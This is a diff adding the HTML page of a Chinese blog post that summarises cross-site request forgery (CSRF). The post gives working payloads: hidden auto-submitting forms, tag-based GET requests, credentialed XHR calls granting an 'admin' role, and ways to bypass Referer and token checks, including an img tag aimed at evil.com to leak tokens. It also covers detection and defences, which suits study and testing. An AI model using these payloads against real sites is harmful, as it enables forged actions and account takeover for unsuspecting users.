@@ -1,0 +1,1692 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web前端,CSRF,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demos's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="CSRF（跨站请求伪造） cross-site request forgery，是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害者不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(比如转账、修改密码、身份信息、伪装他人发文留言等)，本质上来说就是劫持用户的操作，利用服务端对于和已建立会">
+<meta name="keywords" content="web前端,CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF总结">
+<meta property="og:url" content="https://www.lsowl.top/2019/10/27/CSRF总结/index.html">
+<meta property="og:site_name" content="Demos&#39;s Blog">
+<meta property="og:description" content="CSRF（跨站请求伪造） cross-site request forgery，是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害者不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(比如转账、修改密码、身份信息、伪装他人发文留言等)，本质上来说就是劫持用户的操作，利用服务端对于和已建立会">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-28T08:16:41.009Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSRF总结">
+<meta name="twitter:description" content="CSRF（跨站请求伪造） cross-site request forgery，是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害者不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(比如转账、修改密码、身份信息、伪装他人发文留言等)，本质上来说就是劫持用户的操作，利用服务端对于和已建立会">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.lsowl.top/2019/10/27/CSRF总结/">
+
+
+
+
+
+  <title>CSRF总结 | Demos's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demos's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">It's A Long Road</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.top/2019/10/27/CSRF总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demos">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demos's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSRF总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-27T16:13:47+08:00">
+                2019-10-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web前端相关/" itemprop="url" rel="index">
+                    <span itemprop="name">web前端相关</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  627
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><blockquote>
+<p>cross-site request forgery，是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害者不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(比如转账、修改密码、身份信息、伪装他人发文留言等)，本质上来说就是劫持用户的操作，利用服务端对于和已建立会话的客户端的信任进行的攻击 。csrf又称为xsrf，它与xss最大的区别就在于，csrf并没有盗取cookie而是直接利用。</p>
+</blockquote>
+<h3 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h3><p>利用目标用户的合法身份，以用户的名义进行非法的操作</p>
+<h3 id="CSRF的分类"><a href="#CSRF的分类" class="headerlink" title="CSRF的分类"></a>CSRF的分类</h3><h4 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4><p>GET型CSRF漏洞，只需要构造URL，然后诱导受害者访问利用。    HTML中可以设置src/href等地址的标签都可以发起一个GET请求：</p>
+<p>利用a标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用img标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用iframe:注意：可以设置iframe的style为display:none，以此来不显示iframe加载的内容</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>CSS中background利用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"background: url('http://www.xxx.com/new_user.php?username=123&amp;password=123456');"</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还有</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img lowsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img dynsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"refersh"</span> content=<span class="string">"0"</span>; url=<span class="string">""</span>&gt;</span><br><span class="line">&lt;frame src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;script src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;bgsound src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;embed src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;audio src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;table background=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">css样式中：</span><br><span class="line">@<span class="keyword">import</span> <span class="string">""</span></span><br><span class="line">background:url(<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
+<p>除了固定的编写方式之外还可以通过JavaScript动态生成的标签对象或CSS对象发起GET请求。</p>
+<h4 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4><p>POST型CSRF漏洞，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用。构造表单常见是用hidden属性(只能通过form表单的方式提交)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;img src="./</span>logo.png<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf/"&gt;</span></span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;new"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;conf"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> value=<span class="string">"点击查看头像"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">"autosubmit"</span> action=<span class="string">"http://www.example.com/api/setusername"</span> enctype=<span class="string">"text/plain"</span> method=<span class="string">"POST"</span>&amp;&gt;</span><br><span class="line">&lt;input name=<span class="string">"username"</span> type=<span class="string">"hidden"</span> value=<span class="string">"CSRFd"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit Request"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">document.getElementById("autosubmit").submit();</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="利用标签"><a href="#利用标签" class="headerlink" title="利用标签"></a>利用<script>标签</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://www.example.com/api/currentuser"</span>);</span><br><span class="line">xhr.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;ja</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json;charset=UTF-8"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="从信任角度来说明CSRF与XSS的区别"><a href="#从信任角度来说明CSRF与XSS的区别" class="headerlink" title="从信任角度来说明CSRF与XSS的区别"></a>从信任角度来说明CSRF与XSS的区别</h3><p>XSS：利用用户对站点的信任（就是客户端对服务器下发的文件默认是信任的）</p>
+<p>CSRF：利用站点对已经身份认证的信任（默认站点只对经过身份认证的用户是信任的）</p>
+<h3 id="CSRF可能会出现的攻击场景"><a href="#CSRF可能会出现的攻击场景" class="headerlink" title="CSRF可能会出现的攻击场景"></a>CSRF可能会出现的攻击场景</h3><p>修改账号密码、个人信息（email、收货地址）</p>
+<p>发送伪造的业务请求（网银、购物、投票）</p>
+<p>关注他人社交账号、发送推文、留言评论等</p>
+<p>未验证 Referer或者使用 Token 导致用户或者管理员可被 CSRF添加、修改、删除等操作</p>
+<p>以转账为例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化链接：http://www.xxx.com/pay.php?user=xx&amp;amp;money=100</span><br><span class="line">构造恶意链接：http://www.xxx.com/pay.php?user=恶意用户&amp;amp;money=10000</span><br></pre></td></tr></table></figure>
+<h3 id="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"><a href="#CSRF的执行原理图：这里就可以反应出来它与XSS的区别" class="headerlink" title="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"></a>CSRF的执行原理图：这里就可以反应出来它与XSS的区别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527347582.0.png" alt=""></h3><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>被攻击用户已经完成身份认证(已登录)</p>
+<p>新请求的提交不需要重新身份认证或确认机制（如果有token机制则需要获取token，但是由于跨域的原因，攻击者构造的攻击代码无法直接请求被攻击服务器，无法获取token，但是如果配合XSS漏洞获取token，基于token的防护机制就形同虚设）</p>
+<h3 id="CSRF可能存在的点以及检测方法"><a href="#CSRF可能存在的点以及检测方法" class="headerlink" title="CSRF可能存在的点以及检测方法"></a>CSRF可能存在的点以及检测方法</h3><p>寻找测试站点<strong>增删改</strong>的地方，构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。</p>
+<p>检测方法：捕获的数据包，查看在请求和响应过程中检查是否存在anti-CSRF token名 以及验证服务器是否验证anti-CSRF token的值；检测token中的可编辑字符串（可查看以及伪造）；检查referrer头是否可以伪造绕过、查看是否有二次身份认证、验证码等防御措施。</p>
+<h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>增加anti-CSRF token（随机token，随机性强且不易伪造，注意一点，POST请求可以隐藏在表单，如果是GET请求可以添加在cookie中）并在服务端验证</p>
+<p>严格验证Referer，防止被绕过</p>
+<p>关键请求使用<strong>验证码</strong>功能（比如确认转账、确认修改密码操作等，在一些其他场景使用验证码，用户体验不是很好）</p>
+<p>降低会话超时时间</p>
+<h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><p>burpsuit</p>
+<p>CSRFTester（个人觉得不是很好用）</p>
+<h3 id="绕过referer验证"><a href="#绕过referer验证" class="headerlink" title="绕过referer验证"></a>绕过referer验证</h3><p>空Referer绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">空referer头：置空</span><br><span class="line"> </span><br><span class="line">在referer字段后添加：ftp://,http://,https://,file://,javascript:,data等协议头再发送，看是否绕过referer验证。例如https向http跳转的时候referer为空，利用https://www.eval.com/attack.html</span><br></pre></td></tr></table></figure>
+<p>判断referer是否存在某个关键词：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如dvwa中的验证server_name</span><br><span class="line"> </span><br><span class="line">referer判断存在不存在google.com这个关键词</span><br><span class="line"> </span><br><span class="line">在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过</span><br></pre></td></tr></table></figure>
+<p>判断referer是否有某域名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">判断了Referer开头是否以126.com以及126子域名 不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</span><br></pre></td></tr></table></figure>
+<p>在域名前添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在域名前面增加随机的a-z和0-9也可能绕过：</span><br></pre></td></tr></table></figure>
+<p>添加一些特殊的符号绕过，不同的浏览器支持的符号也不一样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/?https://target.org   #思路和绕过URL跳转限制类似</span><br><span class="line"> </span><br><span class="line"><span class="comment">#字典如下</span></span><br><span class="line">,</span><br><span class="line">&amp;</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">;</span></span><br><span class="line"><span class="string">!</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">^</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">+</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">~</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">_</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">%</span></span><br></pre></td></tr></table></figure>
+<p>无referer</p>
+<blockquote>
+<p>与添加不同的协议跳转置空referer不同，这里是直接删除referer头，利用的时候需要在body之前POC中加入meta标签</p>
+</blockquote>
+<p>POC</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="http:/</span><span class="regexp">/127.0.0.1/</span>test.php<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="</span>submit<span class="string">" value="</span>Submit request<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      document.forms[0].submit();</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p>思路：<a href="https://gh0st.cn/archives/2018-08-01/1">组合拳绕过referer限制</a></p>
+<blockquote>
+<p>反射型XSS时受到了referer限制，通过URL重定向漏洞绕过referer限制触发XSS，xss处存在jsonp劫持漏洞，如果直接触发jsonp也受到referer限制，所以通过反射性xss加载jsonp的POC再配合URL跳转漏洞触发。总体上就是URL重定向绕过了xss的referer限制，xss又绕过了jsonp的referer限制。</p>
+</blockquote>
+<p>以上时key师傅的思路，由于文章中的任意URL跳转也是再子域，时referer允许的，个人认为可以直接加载jsonp的POC连接绕过。</p>
+<h3 id="绕过token"><a href="#绕过token" class="headerlink" title="绕过token"></a>绕过token</h3><ul>
+<li>GET型token泄露：例如页面包含<code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code></li>
+<li>POST型token泄露:利用XSS漏洞获取其Cookie，查看存储在其中的Token(组合漏洞)</li>
+</ul>
+<h3 id="总结bypass方法"><a href="#总结bypass方法" class="headerlink" title="总结bypass方法"></a>总结bypass方法</h3><ul>
+<li>删： CSRF token 、referer、 XRSF Header</li>
+<li>置空： CSRF token 、referer</li>
+<li>修改请求方法：POST改为GET</li>
+<li>修改 与token相同长度的任意字符串替换token</li>
+<li>固定token</li>
+<li>组合漏洞：XSS+CSRF(xss打token,cookie或者利用子域的xss漏洞和csrf组合绕过验证)</li>
+<li>token泄露（<a href="http://www.anquan.us/static/bugs/wooyun-2015-090935.html">referer泄露toekn</a>）</li>
+</ul>
+<h2 id="读取型CSRF"><a href="#读取型CSRF" class="headerlink" title="读取型CSRF"></a>读取型CSRF</h2><blockquote>
+<p>前面总结的CSRF是按提交方式分的，且场景是在增删改的情况下触发的，还有一种是读类型的CSRF，由jsonp劫持和CORS跨域资源共享，Flash跨域劫持等，通过这几种方式可以读一些敏感信息出来。</p>
+</blockquote>
